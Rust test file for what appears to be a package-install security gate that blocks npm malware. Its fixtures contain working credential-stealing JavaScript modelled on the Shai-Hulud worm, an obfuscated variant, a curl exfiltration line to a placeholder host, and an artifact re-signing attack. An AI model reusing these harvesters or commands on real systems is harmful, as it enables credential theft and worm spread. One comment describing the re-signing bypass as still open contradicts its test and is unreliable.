//! `verify` domain tests, extracted from the original monolithic tests.rs.

use super::*;

#[test]
fn shai_hulud_worm_is_blocked_at_install() {
    // The harvester the postinstall hook would run: grab the npm token + cloud
    // creds + env, POST them to a webhook, then republish via the stolen token.
    let harvester = "const fs = require('fs');\n\
             const cp = require('child_process');\n\
             const token = fs.readFileSync('/home/runner/.npmrc', 'utf8');\n\
             const aws = fs.readFileSync('/home/runner/.aws/credentials', 'utf8');\n\
             const env = JSON.stringify(process.env);\n\
             fetch('https://canary.invalid/collect', { method: 'POST', body: token + aws + env });\n\
             cp.execSync('npm publish --access public');\n";
    let bytes = npm_tgz_with_files(
        r#"{"name":"shai-hulud","version":"1.0.0","scripts":{"postinstall":"node harvest.js"}}"#,
        &[("harvest.js", harvester)],
    );
    let package = worm_resolved_package("shai-hulud");

    let (verdict, profile) = install_verdict_for_worm(&package, &bytes);
    assert_eq!(
        verdict,
        Verdict::Blocked,
        "a Shai-Hulud-class postinstall credential worm must be blocked at install; caps {:?}",
        profile.capabilities
    );
    assert!(
        profile
            .capabilities
            .iter()
            .any(|c| c.kind == CapabilityKind::ProcSpawn && c.target.starts_with("npm-script:")),
        "the postinstall lifecycle hook must surface as a ProcSpawn capability; caps {:?}",
        profile.capabilities
    );
}

// REGRESSION: the obfuscated variant — string-built capability roots so static
// triggers don't appear literally — must ALSO fail closed (DynamicEval), not
// sneak through as Pure/Accepted.

#[test]
fn obfuscated_shai_hulud_worm_is_blocked_at_install() {
    let harvester = "const p = process['en'+'v'];\n\
             const send = globalThis['fet'+'ch'];\n\
             const run = new Function('return require')()('child_process');\n\
             send('https://canary.invalid/c', { method: 'POST', body: JSON.stringify(p) });\n\
             run.execSync('npm publish');\n";
    let bytes = npm_tgz_with_files(
        r#"{"name":"shai-hulud-obf","version":"1.0.0"}"#,
        &[("index.js", harvester)],
    );
    // No declared lifecycle script here: the obfuscation itself must be enough
    // to fail closed, so the worm can't dodge the gate by hiding its trigger.
    let mut package = worm_resolved_package("shai-hulud-obf");
    package.npm_scripts = BTreeMap::new();

    let (verdict, profile) = install_verdict_for_worm(&package, &bytes);
    assert_eq!(
        verdict,
        Verdict::Blocked,
        "an obfuscated credential worm must fail closed at install; caps {:?}",
        profile.capabilities
    );
    assert!(
        profile
            .capabilities
            .iter()
            .any(|c| c.kind == CapabilityKind::DynamicEval),
        "opaque capability-root access must emit a DynamicEval capability; caps {:?}",
        profile.capabilities
    );
}

// The shipped recommended global config must stay parseable by the REAL
// global-config path (which, unlike a project manifest, has no `[project]`)
// and keep its documented freshness floor, so examples/omc.global.toml can't
// drift from the schema or regress to requiring a project block.

#[test]
fn link_policy_allows_public_node_debug_env_read_only() {
    let package = ResolvedPackage {
        ecosystem: Ecosystem::Npm,
        name: "semver".to_owned(),
        version: "7.8.1".to_owned(),
        source_url: "https://example.invalid/semver.tgz".to_owned(),
        download_url: None,
        local_path: None,
        filename: "semver.tgz".to_owned(),
        expected_sha256: None,
        expected_sha1: None,
        expected_integrity: None,
        npm_direct_tarball: false,
        pypi_direct_wheel: false,
        npm_scripts: BTreeMap::new(),
        platform_compatible: true,
        dependencies: Vec::new(),
    };
    let policy = policy_from_link_options(&LinkOptions::new("."));
    let node_debug_module = module_from_profile(
        &package,
        &[CapabilityFinding {
            kind: CapabilityKind::EnvRead,
            target: "NODE_DEBUG".to_owned(),
            source: "package/internal/debug.js".to_owned(),
            evidence: "process.env".to_owned(),
        }],
    );
    assert!(verify_module(&node_debug_module, &policy).is_ok());

    let secret_module = module_from_profile(
        &package,
        &[CapabilityFinding {
            kind: CapabilityKind::EnvRead,
            target: "NPM_TOKEN".to_owned(),
            source: "package/index.js".to_owned(),
            evidence: "process.env".to_owned(),
        }],
    );
    let error = verify_module(&secret_module, &policy).unwrap_err();
    assert!(error
        .findings
        .iter()
        .any(|finding| finding.message.contains("env.read:NPM_TOKEN not granted")));
}

#[test]
fn artifact_serializes_generated_microcode() {
    let package = ResolvedPackage {
        ecosystem: Ecosystem::Npm,
        name: "date-helper".to_owned(),
        version: "1.2.4".to_owned(),
        source_url: "https://example.invalid/date-helper.tgz".to_owned(),
        download_url: None,
        local_path: None,
        filename: "date-helper.tgz".to_owned(),
        expected_sha256: None,
        expected_sha1: None,
        expected_integrity: None,
        npm_direct_tarball: false,
        pypi_direct_wheel: false,
        npm_scripts: BTreeMap::new(),
        platform_compatible: true,
        dependencies: Vec::new(),
    };
    let findings = vec![CapabilityFinding {
        kind: CapabilityKind::EnvRead,
        target: "NPM_TOKEN".to_owned(),
        source: "index.js".to_owned(),
        evidence: "process.env".to_owned(),
    }];
    let artifact = OmcArtifact {
        schema: ARTIFACT_SCHEMA,
        package: ArtifactPackage {
            ecosystem: package.ecosystem,
            name: package.name.clone(),
            version: package.version.clone(),
        },
        source_url: package.source_url.clone(),
        source_sha256: "0".repeat(64),
        compiler: "test".to_owned(),
        microcode: module_from_profile(&package, &findings),
        behavior: Behavior::HostCapability,
        verdict: Verdict::Blocked,
        grants: Vec::new(),
        dependencies: Vec::new(),
        optional_dependencies: Vec::new(),
        peer_dependencies: Vec::new(),
        files_scanned: 1,
        capabilities: findings,
        verifier_findings: vec!["denied".to_owned()],
        signature: None,
    };

    let json = serde_json::to_string(&artifact).unwrap();

    assert!(json.contains("\"microcode\""));
    assert!(json.contains("\"op\":\"cap\""));
    let decoded: OmcArtifact = serde_json::from_str(&json).unwrap();
    assert_eq!(decoded.microcode.package, "date-helper");
    assert!(matches!(
        decoded.microcode.functions[0].code[0],
        Op::Cap(CapOp::EnvRead { .. })
    ));
}

// F2 REGRESSION (was a CONFIRMED bypass, now FIXED): `module_from_profile`
// now models a tainted data flow from EVERY sensitive source (env/file read)
// to EVERY sink (network, process, fs write, dynamic eval), so the install
// verdict rejects secret->non-http exfil just as it does secret->http.
// Previously only env->http was wired; env->proc, fs-read->net, env->eval and
// env->fs-write were silently Accepted. A covering flow grant still admits
// the flow (so legitimate, explicitly-authorised tools are not over-blocked).

#[test]
fn redteam_secret_to_every_sink_blocked_at_verdict() {
    let package = ResolvedPackage {
        ecosystem: Ecosystem::Npm,
        name: "redteam".to_owned(),
        version: "1.0.0".to_owned(),
        source_url: "https://example.invalid/redteam.tgz".to_owned(),
        download_url: None,
        local_path: None,
        filename: "redteam.tgz".to_owned(),
        expected_sha256: None,
        expected_sha1: None,
        expected_integrity: None,
        npm_direct_tarball: false,
        pypi_direct_wheel: false,
        npm_scripts: BTreeMap::new(),
        platform_compatible: true,
        dependencies: Vec::new(),
    };

    let env = || CapabilityFinding {
        kind: CapabilityKind::EnvRead,
        target: "NPM_TOKEN".to_owned(),
        source: "index.js".to_owned(),
        evidence: "process.env".to_owned(),
    };
    let fs_read = || CapabilityFinding {
        kind: CapabilityKind::FsRead,
        target: "config.json".to_owned(),
        source: "index.js".to_owned(),
        evidence: "fs.readFileSync".to_owned(),
    };
    let http = || CapabilityFinding {
        kind: CapabilityKind::HttpRequest,
        target: "evil.example".to_owned(),
        source: "index.js".to_owned(),
        evidence: "fetch(...)".to_owned(),
    };
    let proc = || CapabilityFinding {
        kind: CapabilityKind::ProcSpawn,
        target: "*".to_owned(),
        source: "index.js".to_owned(),
        evidence: "child_process.spawn".to_owned(),
    };
    let fs_write = || CapabilityFinding {
        kind: CapabilityKind::FsWrite,
        target: "*".to_owned(),
        source: "index.js".to_owned(),
        evidence: "fs.writeFileSync".to_owned(),
    };
    let eval = || CapabilityFinding {
        kind: CapabilityKind::DynamicEval,
        target: "*".to_owned(),
        source: "index.js".to_owned(),
        evidence: "eval".to_owned(),
    };

    // A policy that grants every capability used below, but NO flow rules:
    // so the only thing standing between source and sink is the flow check.
    let caps_only = Policy::pure()
        .allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()))
        .allow_capability(Capability::FsRead("config.json".to_owned()))
        .allow_capability(Capability::HttpHost("evil.example".to_owned()))
        .allow_capability(Capability::ProcSpawn("*".to_owned()))
        .allow_capability(Capability::FsWrite("*".to_owned()))
        .allow_capability(Capability::DynamicEval);

    // Every (sensitive source -> sink) pair is now BLOCKED without a flow grant.
    for (label, caps) in [
        ("env -> http", vec![env(), http()]),
        ("fs-read -> http", vec![fs_read(), http()]),
        ("env -> process", vec![env(), proc()]),
        ("env -> fs-write", vec![env(), fs_write()]),
        ("env -> eval", vec![env(), eval()]),
        ("fs-read -> process", vec![fs_read(), proc()]),
    ] {
        assert!(
            verify_module(&module_from_profile(&package, &caps), &caps_only).is_err(),
            "{label} secret exfil must be blocked at verdict time without a flow grant"
        );
    }

    // A covering flow grant (env:NPM_TOKEN -> process) admits the env->proc
    // flow: we must not over-block an explicitly authorised tool.
    let proc_flow = caps_only.clone().allow_flow(
        LabelMatcher::Env("NPM_TOKEN".to_owned()),
        Sink::Process("*".to_owned()),
    );
    assert!(
        verify_module(&module_from_profile(&package, &[env(), proc()]), &proc_flow).is_ok(),
        "env->process must be admitted when a covering flow grant is present"
    );

    // End-to-end witness: a PLAIN env->curl exfil now profiles to BLOCKED even
    // when the victim grants env:NPM_TOKEN + proc.spawn:* (the build-tool caps).
    let dir = tempfile::tempdir().unwrap();
    let source = dir.path().join("source");
    fs::create_dir_all(&source).unwrap();
    fs::write(
        source.join("index.js"),
        "const t = process.env.NPM_TOKEN;\n\
             const cp = require('child_process');\n\
             cp.spawn('curl', ['-d', t, 'https://canary.invalid/c']);\n",
    )
    .unwrap();
    let report = compile_source_path(CompileSourceOptions {
        project_dir: dir.path().to_path_buf(),
        source_path: source,
        ecosystem: Ecosystem::Npm,
        name: "buildtool".to_owned(),
        version: "1.0.0".to_owned(),
        allowed_capabilities: vec![
            Capability::EnvRead("NPM_TOKEN".to_owned()),
            Capability::ProcSpawn("*".to_owned()),
        ],
        allowed_flows: Vec::new(),
        write_artifact: false,
    })
    .unwrap();
    assert_eq!(
        report.artifact.verdict,
        Verdict::Blocked,
        "plain env->curl exfil must now be Blocked without a covering flow grant"
    );
}

// Part 2: the install gate demotes BENIGN runtime capabilities (network, env
// read, file read, dns, time, random) to informational — installing runs none
// of the package's source, so a library's *runtime* API surface must not block
// `omc add`. But the install-/malware-relevant behaviours stay deny-by-default,
// and every secret-source -> sink FLOW still blocks. This pins both halves so a
// future "just allow everything" regression can't slip through.

#[test]
fn install_gate_demotes_benign_caps_but_keeps_worm_vectors_blocked() {
    let package = ResolvedPackage {
        ecosystem: Ecosystem::Npm,
        name: "demote-fixture".to_owned(),
        version: "1.0.0".to_owned(),
        source_url: "https://example.invalid/demote-fixture.tgz".to_owned(),
        download_url: None,
        local_path: None,
        filename: "demote-fixture.tgz".to_owned(),
        expected_sha256: None,
        expected_sha1: None,
        expected_integrity: None,
        npm_direct_tarball: false,
        pypi_direct_wheel: false,
        npm_scripts: BTreeMap::new(),
        platform_compatible: true,
        dependencies: Vec::new(),
    };
    let env = || CapabilityFinding {
        kind: CapabilityKind::EnvRead,
        target: "STRIPE_API_KEY".to_owned(),
        source: "index.js".to_owned(),
        evidence: "process.env".to_owned(),
    };
    let proxy_env = |name: &str| CapabilityFinding {
        kind: CapabilityKind::EnvRead,
        target: name.to_owned(),
        source: "index.js".to_owned(),
        evidence: format!("process.env.{name}"),
    };
    let http = || CapabilityFinding {
        kind: CapabilityKind::HttpRequest,
        target: "api.stripe.com".to_owned(),
        source: "index.js".to_owned(),
        evidence: "fetch(...)".to_owned(),
    };
    let proc = || CapabilityFinding {
        kind: CapabilityKind::ProcSpawn,
        target: "npm-script:postinstall".to_owned(),
        source: "package.json".to_owned(),
        evidence: "scripts.postinstall".to_owned(),
    };
    let eval = || CapabilityFinding {
        kind: CapabilityKind::DynamicEval,
        target: "*".to_owned(),
        source: "index.js".to_owned(),
        evidence: "eval".to_owned(),
    };
    let fs_write = || CapabilityFinding {
        kind: CapabilityKind::FsWrite,
        target: "*".to_owned(),
        source: "index.js".to_owned(),
        evidence: "fs.writeFileSync".to_owned(),
    };
    let sensitive_read = || CapabilityFinding {
        kind: CapabilityKind::FsRead,
        target: "/home/victim/.ssh/id_rsa".to_owned(),
        source: "index.js".to_owned(),
        evidence: "fs.readFileSync".to_owned(),
    };

    // The install gate starts from the effective package policy (here just the
    // public defaults) and then demotes benign runtime caps on top.
    let base = allow_benign_runtime_capabilities(
        default_public_capabilities()
            .into_iter()
            .fold(Policy::pure(), Policy::allow_capability),
    );
    let accepts = |caps: &[CapabilityFinding]| {
        verify_module(&module_from_profile(&package, caps), &base).is_ok()
    };

    // ACCEPTED: a lone benign capability is no longer an install-time blocker.
    assert!(
        accepts(&[http()]),
        "a network-only library must install clean (runtime API, not install risk)"
    );
    assert!(
        accepts(&[env()]),
        "an env-reading library with no sink must install clean"
    );
    assert!(
        accepts(&[proxy_env("NO_PROXY"), http()]),
        "NO_PROXY is public proxy config, not a credential exfiltration source"
    );
    assert!(
        accepts(&[proxy_env("no_proxy"), http()]),
        "lowercase no_proxy is public proxy config, not a credential exfiltration source"
    );

    // BLOCKED: install-/malware-relevant behaviours stay deny-by-default.
    assert!(
        !accepts(&[proc()]),
        "process spawn (incl. npm lifecycle scripts — the Shai-Hulud vector) must stay blocked"
    );
    assert!(
        !accepts(&[eval()]),
        "dynamic eval / unresolved obfuscation must stay blocked"
    );
    assert!(
        !accepts(&[fs_write()]),
        "file writes (persistence/backdoor) must stay blocked"
    );
    assert!(
        !accepts(&[sensitive_read()]),
        "sensitive-file reads must stay blocked even under the demoted fs.read:* grant"
    );

    // BLOCKED: the exfiltration SHAPE (secret read -> network sink) still needs
    // an explicit flow grant, so a real `stripe` install is gated on the flow,
    // not on its individual env/network capabilities.
    assert!(
        !accepts(&[env(), http()]),
        "env -> network exfil flow must stay blocked even though both caps are benign"
    );
}

#[test]
fn signs_and_verifies_artifact_payloads() {
    let dir = tempfile::tempdir().unwrap();
    let package = ResolvedPackage {
        ecosystem: Ecosystem::Npm,
        name: "signed-pkg".to_owned(),
        version: "1.0.0".to_owned(),
        source_url: "https://example.invalid/signed-pkg.tgz".to_owned(),
        download_url: None,
        local_path: None,
        filename: "signed-pkg.tgz".to_owned(),
        expected_sha256: None,
        expected_sha1: None,
        expected_integrity: None,
        npm_direct_tarball: false,
        pypi_direct_wheel: false,
        npm_scripts: BTreeMap::new(),
        platform_compatible: true,
        dependencies: Vec::new(),
    };
    let mut artifact = OmcArtifact {
        schema: ARTIFACT_SCHEMA,
        package: ArtifactPackage {
            ecosystem: package.ecosystem,
            name: package.name.clone(),
            version: package.version.clone(),
        },
        source_url: package.source_url.clone(),
        source_sha256: "0".repeat(64),
        compiler: "test".to_owned(),
        microcode: module_from_profile(&package, &[]),
        behavior: Behavior::Pure,
        verdict: Verdict::Accepted,
        grants: Vec::new(),
        dependencies: Vec::new(),
        optional_dependencies: Vec::new(),
        peer_dependencies: Vec::new(),
        files_scanned: 0,
        capabilities: Vec::new(),
        verifier_findings: Vec::new(),
        signature: None,
    };

    sign_artifact(dir.path(), &mut artifact).unwrap();

    let signature = artifact.signature.as_ref().unwrap();
    assert_eq!(signature.algorithm, "ed25519");
    assert!(dir.path().join(".omc/keys/artifact-ed25519.key").exists());
    verify_artifact_signature(&artifact).unwrap();

    artifact.source_sha256 = "1".repeat(64);
    assert!(matches!(
        verify_artifact_signature(&artifact).unwrap_err(),
        OmcRegistryError::DigestMismatch { .. }
    ));
}

#[test]
fn install_lock_rejects_tampered_artifact_signature() {
    let dir = tempfile::tempdir().unwrap();
    let bytes = npm_tgz_for_test(
        r#"{
                "name": "pkg",
                "version": "1.0.0"
            }"#,
    );
    let archive = dir.path().join(".omc/cache/npm/pkg.tgz");
    fs::create_dir_all(archive.parent().unwrap()).unwrap();
    fs::write(&archive, &bytes).unwrap();

    let mut package = locked_package_for_test(Ecosystem::Npm, "pkg", "1.0.0");
    package.archive = relative_path(dir.path(), &archive);
    package.sha256 = sha256_hex(&bytes);
    package.artifact_sha256 = write_signed_artifact_for_test(dir.path(), &package);

    let artifact_path = dir.path().join(&package.artifact);
    let mut artifact =
        serde_json::from_str::<OmcArtifact>(&fs::read_to_string(&artifact_path).unwrap()).unwrap();
    artifact.source_sha256 = "1".repeat(64);
    fs::write(
        &artifact_path,
        serde_json::to_string_pretty(&artifact).unwrap(),
    )
    .unwrap();

    let error = install_lock(
        dir.path(),
        &OmcLock {
            version: 1,
            signing_key: Some(project_signing_public_key(dir.path()).unwrap()),
            packages: vec![package],
            local_sources: Vec::new(),
            python_vcs: Vec::new(),
        },
    )
    .unwrap_err();

    assert!(matches!(error, OmcRegistryError::DigestMismatch { .. }));
}

// RED TEAM TRIPWIRE (CONFIRMED BYPASS): the artifact signature is
// self-attesting. `verify_artifact_signature` reads the public key out of
// the artifact's own `signature.public_key` field and verifies against it.
// There is no trust anchor: nothing checks that this key is the project's
// signing key (.omc/keys/artifact-ed25519.key) or any pinned/known key.
//
// Threat model: the attacker is a malicious dependency author who can
// influence the on-disk .omc/artifacts/*.json + omc.lock that the victim
// runs `omc install --locked` / `ci` against (e.g. a poisoned cache shipped
// in a repo, a compromised mirror, or a malicious transitive dep that wrote
// its own artifact). The attacker does NOT have the victim's signing key.
//
// This test re-signs a TAMPERED artifact (verdict Blocked -> Accepted, a
// dangerous grant + capability stripped, source bytes swapped) with a FRESH
// attacker-generated ed25519 key, then syncs the lock entry to match. Both
// `verify_artifact_signature` AND the full `install_lock` path ACCEPT it.
// If a trust anchor is ever added, this test must start failing (then it
// should be converted to assert rejection).

#[test]
fn redteam_attacker_resigned_artifact_is_rejected() {
    let dir = tempfile::tempdir().unwrap();
    let bytes = npm_tgz_for_test(
        r#"{
                "name": "evil",
                "version": "1.0.0"
            }"#,
    );
    let archive = dir.path().join(".omc/cache/npm/evil.tgz");
    fs::create_dir_all(archive.parent().unwrap()).unwrap();
    fs::write(&archive, &bytes).unwrap();

    // 1) Start from a legitimately-signed lock for a BLOCKED package carrying
    //    a dangerous grant. `signed_lock_for_test` pins the project key and
    //    the genuine artifact payload hash.
    let mut package = locked_package_for_test(Ecosystem::Npm, "evil", "1.0.0");
    package.archive = relative_path(dir.path(), &archive);
    package.sha256 = sha256_hex(&bytes);
    package.verdict = Verdict::Blocked;
    package.behavior = Behavior::Pure;
    package.grants = vec!["env.read:*".to_owned()];
    let mut lock = signed_lock_for_test(dir.path(), vec![package.clone()]);

    // 2) ATTACKER tampers the cached artifact: flip the verdict to Accepted
    //    and strip the dangerous grant so the install gate would be satisfied.
    let artifact_path = dir.path().join(&package.artifact);
    let mut artifact =
        serde_json::from_str::<OmcArtifact>(&fs::read_to_string(&artifact_path).unwrap()).unwrap();
    artifact.verdict = Verdict::Accepted;
    artifact.grants = Vec::new();

    // 3) ATTACKER re-signs with their OWN key (no victim key needed). The
    //    forged signature is still self-consistent...
    attacker_resign(&mut artifact);
    verify_artifact_signature(&artifact)
        .expect("self-consistent forged signature still verifies in isolation");
    fs::write(
        &artifact_path,
        serde_json::to_string_pretty(&artifact).unwrap(),
    )
    .unwrap();

    // 4) ATTACKER syncs the lock entry to match the tampered artifact.
    lock.packages[0].verdict = Verdict::Accepted;
    lock.packages[0].grants = Vec::new();

    // 5) `omc install --locked` now REJECTS it: the artifact's embedded key
    //    is not the pinned project key (and its payload hash no longer
    //    matches the pinned `artifact-sha256`).
    let error = install_lock(dir.path(), &lock)
        .expect_err("attacker-resigned artifact must be rejected by the F3 trust anchor");
    assert!(
        matches!(
            error,
            OmcRegistryError::UnsupportedInstallArtifact(_)
                | OmcRegistryError::DigestMismatch { .. }
        ),
        "expected trust-anchor rejection, got {error:?}"
    );
    assert!(
        !dir.path().join("node_modules/evil").exists(),
        "the tampered package must not be installed"
    );
}

// F3 REGRESSION: a pre-F3 lock with no pinned `signing-key` is treated as
// untrusted on the locked-install path and must be re-locked.

#[test]
fn locked_install_requires_pinned_signing_key() {
    let dir = tempfile::tempdir().unwrap();
    let bytes = npm_tgz_for_test(r#"{ "name": "pkg", "version": "1.0.0" }"#);
    let archive = dir.path().join(".omc/cache/npm/pkg.tgz");
    fs::create_dir_all(archive.parent().unwrap()).unwrap();
    fs::write(&archive, &bytes).unwrap();

    let mut package = locked_package_for_test(Ecosystem::Npm, "pkg", "1.0.0");
    package.archive = relative_path(dir.path(), &archive);
    package.sha256 = sha256_hex(&bytes);
    package.artifact_sha256 = write_signed_artifact_for_test(dir.path(), &package);

    // Lock omits `signing-key` (pre-F3 / attacker-stripped).
    let lock = OmcLock {
        version: 1,
        signing_key: None,
        packages: vec![package],
        local_sources: Vec::new(),
        python_vcs: Vec::new(),
    };
    let error = install_lock(dir.path(), &lock)
        .expect_err("a lock without a pinned signing key must not be trusted");
    assert!(matches!(
        error,
        OmcRegistryError::UnsupportedInstallArtifact(_)
    ));
}
